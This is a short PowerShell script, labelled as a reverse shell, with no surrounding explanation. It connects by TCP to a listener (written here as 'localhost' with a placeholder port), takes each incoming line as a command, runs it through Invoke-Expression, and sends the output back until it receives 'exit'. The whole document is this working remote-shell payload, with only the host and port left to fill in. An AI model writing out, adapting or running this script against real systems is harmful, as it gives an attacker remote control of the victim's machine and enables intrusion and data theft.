$revshell = {
    $client = New-Object System.Net.Sockets.TCPClient("localhost", port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true
    while (($command = $reader.ReadLine()) -ne "exit") {
        try {
            $output = (Invoke-Expression $command 2>&1 | Out-String)
            $writer.WriteLine($output)
        } catch {
            $writer.WriteLine("Error: $_")
        }
    }
    $client.Close()
}
Invoke-Command -ScriptBlock $revshell